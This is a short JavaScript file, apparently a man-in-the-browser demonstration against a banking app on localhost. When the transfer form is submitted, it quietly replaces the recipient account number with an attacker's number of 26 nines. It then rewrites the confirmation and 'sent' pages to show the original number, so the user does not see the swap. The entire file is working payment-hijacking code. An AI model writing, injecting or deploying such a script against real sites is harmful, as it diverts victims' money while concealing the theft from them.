let eavesdropperAccountNumber = '';

for(let i = 0; i < 26; i++) {
    eavesdropperAccountNumber += '9';
}

localStorage.setItem('fake_account_number', eavesdropperAccountNumber);


function regex() {
    return new RegExp(eavesdropperAccountNumber, 'g');
}

if(window.location.href == 'http://localhost:8000/transfer_confirm/') {
    let data = document.getElementById('transfer_data').innerHTML;
    let replacedData = data.replace(regex(), localStorage.getItem('real_account_number'));
    document.getElementById('transfer_data').innerHTML = replacedData;
}

if(window.location.href == 'http://localhost:8000/transfer/') {
    document.addEventListener('submit', () => {
        localStorage.setItem('real_account_number', document.getElementById('id_recipient_account').value);
        document.getElementById('id_recipient_account').value = localStorage.getItem('fake_account_number');
    });
}

if(window.location.href == 'http://localhost:8000/transfer_sent/'){
    document.getElementById('account').innerHTML = localStorage.getItem('real_account_number');
}